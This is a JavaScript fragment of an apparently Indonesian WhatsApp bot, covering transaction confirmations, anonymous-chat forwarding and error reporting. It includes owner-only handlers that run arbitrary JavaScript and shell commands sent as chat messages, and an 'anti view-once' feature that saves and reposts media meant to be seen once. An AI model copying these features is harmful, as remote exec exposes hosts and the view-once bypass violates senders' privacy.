let sukses = `「 *TRANSAKSI BERHASIL* 」\n\n\`\`\`📆 TANGGAL : @tanggal\n⌚ JAM : @jam\n✨ STATUS : Berhasil\`\`\`\n\nTerimakasih @user Next Order ya🙏`
const getTextD = getTextSetDone(m.chat, set_done);
if (getTextD !== undefined) {
var anunya = (getTextD.replace('@pesanan', tek ? tek : '-').replace('@user', '@' + m.quoted.sender.split("@")[0]).replace('@jam', time).replace('@tanggal', tanggal(new Date())).replace('@user', '@' + m.quoted.sender.split("@")[0]))
Aira.sendTextWithMentions(m.chat, anunya, m)
} else {
Aira.sendTextWithMentions(m.chat, (sukses.replace('@pesanan', tek ? tek : '-').replace('@user', '@' + m.quoted.sender.split("@")[0]).replace('@jam', time).replace('@tanggal', tanggal(new Date())).replace('@user', '@' + m.quoted.sender.split("@")[0])), m)}
}

if (budy.startsWith('=> ')) {
if (!isCreator) return newReply(mess.OnlyOwner)
function Return(sul) {
sat = JSON.stringify(sul, null, 2)
bang = util.format(sat)
if (sat == undefined) {
bang = util.format(sul)
}
return newReply(bang)
}
try {
newReply(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)))
} catch (e) {
newReply(util.format(e))
}
}

if (budy.startsWith('> ')) {
if (!isCreator) return newReply(mess.OnlyOwner)
try {
let evaled = await eval(budy.slice(2))
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await newReply(evaled)
} catch (err) {
await newReply(util.format(err))
}
}


if (prefix && command) {
const Styles = (text, style = 1) => {
  var xStr = 'abcdefghijklmnopqrstuvwxyz1234567890'.split('');
  var yStr = {
    1: 'ᴀʙᴄᴅᴇꜰɢʜɪᴊᴋʟᴍɴᴏᴘqʀꜱᴛᴜᴠᴡxʏᴢ1234567890'
  };
  var replacer = [];
  xStr.map((v, i) =>
    replacer.push({
      original: v,
      convert: yStr[style].split('')[i]
    })
  );
  var str = text.toLowerCase().split('');
  var output = [];
  str.map((v) => {
    const find = replacer.find((x) => x.original == v);
    find ? output.push(find.convert) : output.push(v);
  });
  return output.join('');
};
const didyoumean = require('didyoumean');
const similarity = require('similarity');
let caseNames = getCaseNames();


function getCaseNames() {
    
const fs = require('fs');
    try {
        const data = fs.readFileSync('./aira.ryujin.js', 'utf8');
        const casePattern = /case\s+'([^']+)'/g;
        const matches = data.match(casePattern);
        if (matches) {
            const caseNames = matches.map(match => match.replace(/case\s+'([^']+)'/, '$1'));
            return caseNames;
        } else {
            return [];
        }
    } catch (error) {
        console.error('Terjadi kesalahan:', error);
        return [];
    }
}

let noPrefix = m.text.replace(prefix, '').trim();
    
    let mean = didyoumean(noPrefix, caseNames);
    let sim = similarity(noPrefix, mean);
    let similarityPercentage = parseInt(sim * 100);

    if (mean && noPrefix.toLowerCase() !== mean.toLowerCase()) {
      let response = Styles(`Maaf, command yang Anda masukkan salah. Berikut adalah command yang mungkin sesuai:\n\n➠  *${prefix + mean}*\n➠  *Kemiripan:* ${similarityPercentage}%`, 1);

newReply(response)
 }
 }


if (budy.startsWith('$ ')) {
if (!isCreator) return newReply(mess.OnlyOwner)
exec(budy.slice(2), (err, stdout) => {
if (err) return newReply(`${err}`)
if (stdout) return newReply(stdout)
})
}
if (m.mtype == 'viewOnceMessageV2') {
if (!setting.antiViewOnce) return
let msg = m.message.viewOnceMessageV2.message
 console.log(msg)
let type = Object.keys(msg)[0]
let media = await downloadContentFromMessage(msg[type], type == 'imageMessage' ? 'image' : 'video')
let buffer = Buffer.from([])
 for await (const chunk of media) {
buffer = Buffer.concat([buffer, chunk])
 }
let teks = `「 *ANTI VIEWONCE MESSAGE* 」

📛 *Name* : ${m.pushName}
👤 *User* : @${m.sender.split("@")[0]}
⏰ *Clock* : ${moment.tz('Asia/Jakarta').format('HH:mm:ss')} WIB
✍️ *MessageType* : ${m.mtype}
💬 *Caption* : ${m.msg.caption ? m.msg.caption : "no caption"}`

await Aira.sendTextWithMentions(m.chat, teks, m)
await delay(500)
if (/video/.test(type)) {
return Aira.sendFile(m.chat, buffer, 'media.mp4', msg[type].caption || '', m)
}
else if (/image/.test(type)) {
return Aira.sendFile(m.chat, buffer, 'media.jpg', msg[type].caption || '', m)
}
}

if (m.chat.endsWith('@s.whatsapp.net') && !isCmd) {
this.menfes = this.menfes ? this.menfes : {}
let room = Object.values(this.menfes).find(room => [room.a, room.b].includes(m.sender) && room.state === 'CHATTING')
if (room) {
if (/^.*(next|leave|start)/.test(m.text)) return
if (['.next', '.leave', '.stop', '.start', 'Cari Partner', 'Keluar', 'Lanjut', 'Stop'].includes(m.text)) return
find = Object.values(this.menfes).find(menpes => [menpes.a, menpes.b].includes(m.sender))
let other = find.a == m.sender ? find.b : find.a
await m.copyNForward(other, true, m.quoted && m.quoted.fromMe ? {
contextInfo: {
...m.msg.contextInfo,
participant: other
}
} : {})
}
}

if (m.chat.endsWith('@s.whatsapp.net') && !isCmd) {
this.anonymous = this.anonymous ? this.anonymous : {}
let room = Object.values(this.anonymous).find(room => [room.a, room.b].includes(m.sender) && room.state === 'CHATTING')
if (room) {
if (/^.*(next|leave|start)/.test(m.text)) return
if (['.next', '.leave', '.stop', '.start', 'Cari Partner', 'Keluar', 'Lanjut', 'Stop'].includes(m.text)) return
let other = [room.a, room.b].find(user => user !== m.sender)
m.copyNForward(other, true, m.quoted && m.quoted.fromMe ? {
contextInfo: {
...m.msg.contextInfo,
forwardingScore: 0,
isForwarded: true,
participant: other
}
} : {})
}
return !0
}

}


} catch (err) {
//console.log(err)
m.reply('fitur ini butuh maintenance atau tidak tersedia sementara!, harap hubungi owner agar segera diperbaiki')

let pengirim;

if (m.chat.includes('@g.us')){
async function getGcName(groupID) {
try {
let data_name = await Aira.groupMetadata(groupID)
return data_name.subject
} catch (err) {
return ''
}
}
pengirim = await getGcName(m.chat)
}
else if (m.chat.includes('@s.whatsapp.net')){
pengirim = m.chat.split('@')[0]
}

Aira.sendMessage(setting.ownerNumber[0],{text: `LAPOR TUAN ADA ERROR DIBAGIAN: ${budy}\nPADA CHAT: ${pengirim}\nKETERANGAN ERROR:\n${util.format(err)}` })
//process.exit()
}
}


let file = require.resolve(__filename)
fs.watchFile(file, () => {
fs.unwatchFile(file)
console.log(chalk.redBright(`Update ${__filename}`))
delete require.cache[file]
require(file)
})
// Credit By ZeeoneOfc
// Recode By Ryujin